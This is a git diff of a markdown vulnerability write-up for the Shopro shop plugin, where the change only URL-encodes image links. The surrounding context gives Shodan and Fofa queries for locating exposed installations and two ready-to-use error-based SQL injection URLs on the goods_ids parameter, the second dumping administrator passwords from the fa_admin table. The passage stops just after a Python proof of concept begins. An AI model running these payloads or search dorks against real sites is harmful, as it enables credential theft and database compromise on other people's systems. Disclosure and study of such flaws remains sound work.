@@ -3,7 +3,7 @@
   
 Official Website：https://shopro.top
 Github：https://github.com/ITmonkey-cn/shopro.git
-![](./images/Pasted image 20220701231852.png)
+![](./images/Pasted%20image%2020220701231852.png)
 ## Search
 shodan：http.title:"shopro"
 fofa：title="shopro"
@@ -20,25 +20,25 @@ V1.3.8
 
 ## Vulnerability Description AND recurrence
 
-![](./images/Pasted image 20220701232717.png)
+![](./images/Pasted%20image%2020220701232717.png)
 1. F12 find something interesting
-	![](./images/Pasted image 20220701234759.png)
+	![](./images/Pasted%20image%2020220701234759.png)
 
 2. parameter goods_ids has sql error message
-	![](./images/Pasted image 20220701234835.png)
+	![](./images/Pasted%20image%2020220701234835.png)
 
 	```
 	http://url/addons/shopro/goods/lists?page=1&goods_ids=32),updatexml(1,concat(0x7e,(select database()),0x7e),1)-- -
 	```
 
 3. Find information whit Error-Based SQL Injection 
-	![](./images/Pasted image 20220701235115.png)
+	![](./images/Pasted%20image%2020220701235115.png)
 
 
 	```
 	http://url/addons/shopro/goods/lists?page=1&goods_ids=32),updatexml(1,concat(0x7e,(select group_concat(password) from fa_admin),0x7e),1)-- -
 	```
-	![](./images/Pasted image 20220701235712.png)
+	![](./images/Pasted%20image%2020220701235712.png)
 4. POC
 	```
 	import requests
